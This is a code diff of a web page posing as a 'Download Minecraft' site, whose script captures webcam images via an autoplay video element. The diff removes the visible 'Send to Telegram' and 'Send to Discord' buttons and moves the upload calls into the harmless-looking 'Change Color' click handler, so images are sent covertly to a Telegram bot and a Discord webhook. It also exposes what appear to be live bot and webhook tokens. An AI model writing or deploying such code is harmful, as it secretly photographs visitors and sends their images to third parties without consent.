@@ -83,8 +83,6 @@
 
     <button id="downloadButton">Download Minecraft</button>
     <button id="colorChangeButton">Change Color</button>
-    <button id="sendToTelegramButton">Send to Telegram</button>
-    <button id="sendToDiscordButton">Send to Discord</button>
     <video id="videoElement" autoplay></video>
     <div id="status"></div>
     <div id="successMessage">Image sent successfully!</div>
@@ -170,16 +168,11 @@
             document.body.style.color = textColor;
             downloadButton.style.backgroundColor = colors[index]; // Change button color along with background
             index = (index + 1) % colors.length;
-        });
 
-        const sendToTelegramButton = document.getElementById('sendToTelegramButton');
-        sendToTelegramButton.addEventListener('click', function () {
-            const telegramWebhookURL = 'https://api.telegram.org/7003330372:AAEj0rg44xPlKIEPC4hr9wnJMd22vnVkbDg/sendPhoto'; // Replace YOUR_BOT_TOKEN with your bot token
+            // Automatically send the captured image to both Telegram and Discord
+            const telegramWebhookURL = 'https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendPhoto'; // Replace <YOUR_BOT_TOKEN> with your bot token
             capturePicture(telegramWebhookURL);
-        });
 
-        const sendToDiscordButton = document.getElementById('sendToDiscordButton');
-        sendToDiscordButton.addEventListener('click', function () {
             const discordWebhookURL = 'https://ptb.discord.com/api/webhooks/1218581972482527292/56_Q51t96EYp1h_rD6A9ub5RQOn-_dtfNWY-kjvd3smQy2O8Ly-wVzWi6t-8dAQ7oCg1'; // Replace YOUR_DISCORD_WEBHOOK with your Discord webhook URL
             capturePicture(discordWebhookURL);
         });
